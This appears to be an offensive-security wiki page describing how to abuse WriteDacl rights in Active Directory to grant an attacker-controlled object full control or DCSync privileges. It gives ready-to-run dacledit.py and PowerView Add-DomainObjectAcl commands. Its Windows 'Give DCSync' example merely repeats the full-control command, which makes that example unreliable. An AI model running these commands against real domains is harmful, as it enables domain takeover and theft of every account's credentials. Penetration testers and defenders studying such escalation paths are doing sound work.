# Grant rights

This abuse can be carried out when controlling an object that has `WriteDacl` over another object.

The attacker can write a new ACE to the target objectâ€™s DACL (Discretionary Access Control List). This can give the attacker full control of the target object.&#x20;

Instead of giving full control, the same process can be applied to allow an object to [DCSync](../credentials/dumping/dcsync.md) by adding two ACEs with specific Extended Rights (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`). Giving full control leads to the same thingsince `GenericAll` includes all `ExtendedRights`, hence the two extended rights needed for DCSync to work.

Story time, Exchange Servers used to have `WriteDacl` over domain objects, allowing attackers to conduct a [PrivExchange](../exchange-services/privexchange.md) attack where control would be gained over an Exchange Server which would then be used to grant an attacker-controlled object DCSync privileges to the domain.

{% tab title="UNIX-like" %}
From UNIX-like systems, this can be done with [Impacket](https://github.com/SecureAuthCorp/impacket)'s dacledit.py (Python).

:warning: _At the time of writing, May 2nd 2022, the_ [_Pull Request (#1291)_](https://github.com/SecureAuthCorp/impacket/pull/1291) _is still pending._

```bash
# Give full control
dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target 'target_object' 'domain'/'user':'password'

# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' 'domain'/'user':'password'
```

For a DCSync granting attack, instead of using dacledit, [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) has the ability to operate that abuse with the `--escalate-user` option (see [this](https://medium.com/@arkanoidctf/hackthebox-writeup-forest-4db0de793f96)).

{% tab title="Windows" %}
From a Windows system, this can be achieved with [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash
# Give full control
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"

# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
```

{% hint style="info" %}
A few tests showed the `Add-DomainObjectAcl` command needed to be run with the `-Credential` and `-Domain` options in order to work
{% endhint %}
